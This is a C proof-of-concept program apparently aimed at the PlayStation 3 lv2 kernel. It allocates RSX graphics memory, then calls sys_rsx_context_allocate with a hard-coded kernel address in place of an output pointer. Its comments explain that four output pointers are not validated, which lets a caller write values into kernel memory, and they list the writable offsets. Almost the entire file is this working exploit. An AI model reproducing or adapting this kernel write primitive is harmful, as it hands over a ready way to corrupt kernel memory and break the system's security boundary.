#include <stdio.h>

#include "lv2.h"
#include "output.h"
typedef struct {
	uint32_t mem_handle;
	uint64_t mem_addr;
} RSX_MALLOC;

typedef struct {
	uint32_t context_id;
	uint64_t lpar_dma_control;
	uint64_t lpar_driver_info;
	uint64_t lpar_reports;
} RSX_CALLOC;

int main(void)
{
//Allocate RSX memory.
	RSX_MALLOC *RSXMLC = new RSX_MALLOC();
	uint32_t local_mem_size = 0x0F900000;
	uint64_t flags = 0x80000;
	uint64_t a5 = 0x300000;
	uint64_t a6 = 0xF;
	uint64_t a7 = 0x8;

	int32_t malloc_return = lv2_syscall_7(SYS_RSX_MEMORY_ALLOCATE, (uint64_t)&RSXMLC->mem_handle, (uint64_t)&RSXMLC->mem_addr, local_mem_size, flags, a5, a6, a7);
	printf("sys_rsx_memory_allocate:\n");
	printf(" - return: 0x%08x\n", malloc_return);

	//Allocate RSX context.
	RSX_CALLOC *RSXCLC = new RSX_CALLOC();
	uint64_t system_mode = 0;
	
	/*
	 * lv2 SysCall 670 (0x29E): sys_rsx_context_allocate
	 * @param context_id (OUT): RSX context, E.g. 0x55555555 (in vsh.self)
	 * @param lpar_dma_control (OUT): Control register area. E.g. 0x60100000 (in vsh.self)
	 * @param lpar_driver_info (OUT): RSX data like frequencies, sizes, version... E.g. 0x60200000 (in vsh.self)
	 * @param lpar_reports (OUT): Report data area. E.g. 0x60300000 (in vsh.self)
	 * @param mem_ctx (IN): mem_ctx given by sys_rsx_memory_allocate
	 * @param system_mode (IN):
	 */
	
	/*
	After some verification it turns out that 4 pointers aren't checked
	They are:
	context_id
	lpar_dma_control
	lpar_driver_info
	lpar_reports
	
	we can write values at:
	rsx_context + 0x04 (4Bytes) - context_id
	rsx_context + 0x20 (8Bytes) - lpar_dma_control
	rsx_context + 0x30 (8Bytes) - lpar_driver_info
	rsx_context + 0x40 (8Bytes) - lpar_reports
	
	to properly specify a kernel address use ULL for big numbers
	*/
	//0x800000000037DB70ULL
	//0x800000000036AB98ULL
	int32_t calloc_return = lv2_syscall_6(SYS_RSX_CONTEXT_ALLOCATE, (uint64_t)&RSXCLC->context_id, 0x800000000037DB70ULL, (uint64_t)&RSXCLC->lpar_driver_info, (uint64_t)&RSXCLC->lpar_reports, (uint64_t)RSXMLC->mem_handle, system_mode);
	printf("sys_rsx_context_allocate:\n");
	printf(" - return: 0x%08x\n", calloc_return);
	return 0;
}
